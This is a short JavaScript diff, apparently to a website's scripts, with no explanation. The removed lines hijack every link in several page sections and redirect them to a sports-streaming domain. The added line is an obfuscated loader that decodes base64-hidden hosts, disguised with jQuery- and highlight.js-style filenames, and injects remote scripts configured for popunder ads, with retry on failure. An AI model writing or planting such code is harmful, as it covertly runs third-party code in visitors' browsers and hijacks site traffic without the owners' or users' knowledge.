@@ -1,6 +1,2 @@
-["#ayala-today a", ".main-wrapp a", ".BoxContent a"].forEach(selector => {
-    document.querySelectorAll(selector).forEach(e => {
-        e.href = "https://www.yallashot-live.xyz/";
-    });
-});
+(function(){var p=window,v="b1bdc9b7e4e9e4fd4aa74a7ddc6b2285",d=[["siteId",837*42-564*244+5409529],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],a=["d3d3LmNkbjRhZHMuY29tL3hqcXVlcnkuZml0dGV4dC5taW4uY3Nz","ZDNnNW92Zm5nanc5YncuY2xvdWRmcm9udC5uZXQvcmlLbm4vZmhpZ2hsaWdodGpzLWxpbmUtbnVtYmVycy5taW4uanM="],o=-1,e,x,y=function(){clearTimeout(x);o++;if(a[o]&&!(1807353537000<(new Date).getTime()&&1<o)){e=p.document.createElement("script");e.type="text/javascript";e.async=!0;var f=p.document.getElementsByTagName("script")[0];e.src="https://"+atob(a[o]);e.crossOrigin="anonymous";e.onerror=y;e.onload=function(){clearTimeout(x);p[v.slice(0,16)+v.slice(0,16)]||y()};x=setTimeout(y,5E3);f.parentNode.insertBefore(e,f)}};if(!p[v]){try{Object.freeze(p[v]=d)}catch(e){}y()}})();
 
